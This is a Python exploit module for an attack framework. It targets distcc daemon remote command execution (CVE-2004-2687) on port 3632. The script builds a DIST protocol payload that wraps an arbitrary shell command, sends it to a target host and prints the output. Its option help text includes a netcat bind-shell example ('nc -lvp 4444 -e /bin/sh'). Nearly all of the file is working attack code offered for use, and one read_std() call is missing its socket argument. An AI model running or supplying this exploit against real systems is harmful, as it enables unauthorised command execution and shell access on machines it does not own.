import random,socket,string
from waf.libs.color  import *
from waf.libs import variable as var

var.all_var['rports']='3632'
info = {
        "name"        : "distcc_exec",
        "title"       : "DistCC Daemon Command Execution",
        "module"      : "exploits/unix/misc/distcc_exec distcc_exec distcc cve-2004-2687",
        "description" : """
 This module uses a documented security weakness to execute
  arbitrary commands on any system running distccd.
        """
        }


options ={
  "RHOSTS"  : [str(var.all_var['rhosts']),'The target host'],
  "RPORTS"  : [str(var.all_var['rports']),'The target port'],
  "COMMAND" : [str(var.all_var['command']),'The execute command [if (bind connect) : nc -lvp 4444 -e /bin/sh]']
}

def rand_text_alphanumeric(len):
	str = ""
	for i in range(len):
		str += random.choice(string.ascii_letters + string.digits)
	return str

def read_std(s):
	s.recv(4) # Ignore
	len = int(s.recv(8), 16) # Get output length
	if len != 0:
		return s.recv(len)

def exploit(command, host, port):
	args = ["sh", "-c", command, "#", "-c", "main.c", "-o", "main.o"]
	payload = "DIST00000001" + "ARGC%.8x" % len(args)
	for arg in args:
		payload += "ARGV%.8x%s" % (len(arg), arg)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socket.setdefaulttimeout(5)
	s.settimeout(5)
	if s.connect_ex((host, port)) == 0:
		print(blue+"[*]"+default+"Connected to remote service")
		try:
			s.send(payload)
			dtag = "DOTI0000000A" + rand_text_alphanumeric(10)
			s.send(dtag)			
			s.recv(24)
			print(blue+"[*]"+default+"BEGIN BUFFER\n")
			buff = read_std() # STDERR
			if buff:
				print(buff)
			buff = read_std(s) # STDOUT
			if buff:
				print(buff)
			print(blue+"[*]"+default+"END BUFFER \n")
			print(green+"[+]"+default+"Done.")
		except socket.timeout:
			print(red+"[-]"+default+"Socket Timeout")
		except socket.error:
			print(red+"[-]"+default+"Socket Error")
		except Exception as e:
			print(red+"[-]"+default+"Exception Raised")
		finally:
			s.close()		
	else:
		print(red+"[-]"+default+"Failed to connect to %s on port %d" % (host, port))

def running():
    try:
       exploit(str(var.all_var['command']),str(var.all_var['rhosts']),int(var.all_var['rports']))
    except Exception as e:
        print(red+"\n[-]"+default+"Error : "+str(e))
